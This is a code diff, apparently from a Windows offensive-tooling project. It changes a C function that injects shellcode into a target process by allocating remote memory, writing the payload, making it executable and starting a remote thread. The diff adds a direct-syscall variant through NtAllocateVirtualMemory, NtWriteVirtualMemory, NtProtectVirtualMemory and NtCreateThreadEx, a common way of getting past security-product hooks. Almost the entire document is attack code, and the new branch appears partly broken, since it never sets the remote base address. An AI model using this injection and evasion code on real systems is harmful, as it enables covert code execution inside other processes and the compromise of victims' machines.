@@ -1,7 +1,9 @@
 #include <stdio.h>
 #include <Windows.h>
 #include <tlhelp32.h>
+
 #include "error.h"
+#include "direct_syscall.h"
 
 BOOL findTargetProcessRemoteShellCode(IN char* szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {
 
@@ -51,7 +53,8 @@ BOOL findTargetProcessRemoteShellCode(IN char* szProcessName, OUT DWORD* dwProce
         return bState;
 }
 
-BOOL runShellcodeInjection(IN char* TARGET_PROCESS, IN  PBYTE pShellcodeBuffer, IN DWORD dwShellcodeBufferSize) {
+BOOL runShellcodeInjection(IN char* TARGET_PROCESS, IN  PBYTE pShellcodeBuffer, IN DWORD dwShellcodeBufferSize, IN enum DirectSyscallSwitch DirectSyscallSwitch, IN pNtTable pNtTable) {
+
 
     HANDLE hProcess = NULL;
     DWORD dwProcessId = 0;
@@ -59,39 +62,82 @@ BOOL runShellcodeInjection(IN char* TARGET_PROCESS, IN  PBYTE pShellcodeBuffer, 
     LPVOID pShellcodeBaseAddress = NULL;
     SIZE_T sNumberOfBytesWritten = 0;
     DWORD dwOldProtection = 0;
+ 
 
-    if (!findTargetProcessRemoteShellCode(TARGET_PROCESS, &dwProcessId, &hProcess)) {
-        handleError(ERROR_INVALID_PROCESS, "Failed to find target process");
-        return FALSE;
+    switch (DirectSyscallSwitch)
+    {
+    case On:
+        // Not yet DS friendly.
+        if (!findTargetProcessRemoteShellCode(TARGET_PROCESS, &dwProcessId, &hProcess)) {
+            handleError(ERROR_INVALID_PROCESS, "Failed to find target process");
+            return FALSE;
+        }
+
+        if (!runDirectSyscall(&pNtTable, SysNtAllocateVirtualMemory, hProcess, dwShellcodeBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
+            handleError(ERROR_INVALID_SYSCALL, "Failed to call NtAllocateVirtualMemory");
+            return FALSE;
+        }
+
+        printf("Allocated memory in the remote process\n");
+
+        if (!runDirectSyscall(&pNtTable, SysNtWriteVirtualMemory, hProcess, pShellcodeBaseAddress, pShellcodeBuffer, dwShellcodeBufferSize, &sNumberOfBytesWritten) || dwShellcodeBufferSize != sNumberOfBytesWritten) {
+            handleError(ERROR_INVALID_SYSCALL, "Failed to call NtWriteVirtualMemory");
+            return FALSE;
+        }
+
+        printf("Wrote memory in the remote process\n");
+
+        if (!runDirectSyscall(&pNtTable, SysNtProtectVirtualMemory, hProcess, pShellcodeBaseAddress, dwShellcodeBufferSize, 0x40, &dwOldProtection)) {
+            handleError(ERROR_INVALID_SYSCALL, "Failed to call NtProtectVirtualMemory");
+            return FALSE;
+        }
+
+        printf("[#] Press any key to execute the shellcode\n");
+        getchar();
+
+        if (!runDirectSyscall(&pNtTable, SysNtCreateThreadEx, hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeBaseAddress, NULL, 0, NULL, NULL)) {
+            handleError(ERROR_INVALID_SYSCALL, "Failed to call NtCreateThreadEx");
+            return FALSE;
+        }
+
+        printf("[+] Shellcode executed successfully\n");
+        break;
+    // Default is off, for now.
+    default:
+        if (!findTargetProcessRemoteShellCode(TARGET_PROCESS, &dwProcessId, &hProcess)) {
+            handleError(ERROR_INVALID_PROCESS, "Failed to find target process");
+            return FALSE;
+        }
+        getchar();
+        if (!(pShellcodeBaseAddress = VirtualAllocEx(hProcess, NULL, dwShellcodeBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
+            handleError(ERROR_FAILED_TO_ALLOCATE_MEMORY, "Failed to allocate memory in the remote process");
+            return FALSE;
+        } 
+
+        if (!WriteProcessMemory(hProcess, pShellcodeBaseAddress, pShellcodeBuffer, dwShellcodeBufferSize, &sNumberOfBytesWritten) || dwShellcodeBufferSize != sNumberOfBytesWritten) {
+            handleError(ERROR_FAILED_TO_WRITE_MEMORY, "Failed to write memory in the remote process");
+            return FALSE;
+        }
+
+        // Debugging purposes
+        // printf("[i] Wrote Shellcode to address 0x%p \n", pShellcodeBaseAddress);
+
+        if (!VirtualProtectEx(hProcess, pShellcodeBaseAddress, dwShellcodeBufferSize, 0x40, &dwOldProtection)) {
+            handleError(ERROR_FAILED_TO_OPEN_PROCESS, "Failed to change memory protection in the remote process");
+            return FALSE;
+        }
+
+        printf("[#] Press any key to execute the shellcode\n");
+        getchar();
+
+        if(!CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeBaseAddress, NULL, 0, NULL, NULL)) {
+            handleError(ERROR_FAILED_TO_OPEN_THREAD, "Failed to create remote thread in the remote process");
+            return FALSE;
+        }
+
+        printf("[+] Shellcode executed successfully\n");
+        break;
     }
-
-    if (!(pShellcodeBaseAddress = VirtualAllocEx(hProcess, NULL, dwShellcodeBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
-        handleError(ERROR_FAILED_TO_ALLOCATE_MEMORY, "Failed to allocate memory in the remote process");
-        return FALSE;
-    } 
-
-    if (!WriteProcessMemory(hProcess, pShellcodeBaseAddress, pShellcodeBuffer, dwShellcodeBufferSize, &sNumberOfBytesWritten) || dwShellcodeBufferSize != sNumberOfBytesWritten) {
-        handleError(ERROR_FAILED_TO_WRITE_MEMORY, "Failed to write memory in the remote process");
-        return FALSE;
-    }
-
-    // Debugging purposes
-    // printf("[i] Wrote Shellcode to address 0x%p \n", pShellcodeBaseAddress);
-
-    if (!VirtualProtectEx(hProcess, pShellcodeBaseAddress, dwShellcodeBufferSize, 0x40, &dwOldProtection)) {
-        handleError(ERROR_FAILED_TO_OPEN_PROCESS, "Failed to change memory protection in the remote process");
-        return FALSE;
-    }
-
-    printf("[#] Press any key to execute the shellcode\n");
-    getchar();
-
-    if(!CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeBaseAddress, NULL, 0, NULL, NULL)) {
-        handleError(ERROR_FAILED_TO_OPEN_THREAD, "Failed to create remote thread in the remote process");
-        return FALSE;
-    }
-
-    printf("[+] Shellcode executed successfully\n");
 
     return TRUE;
 }
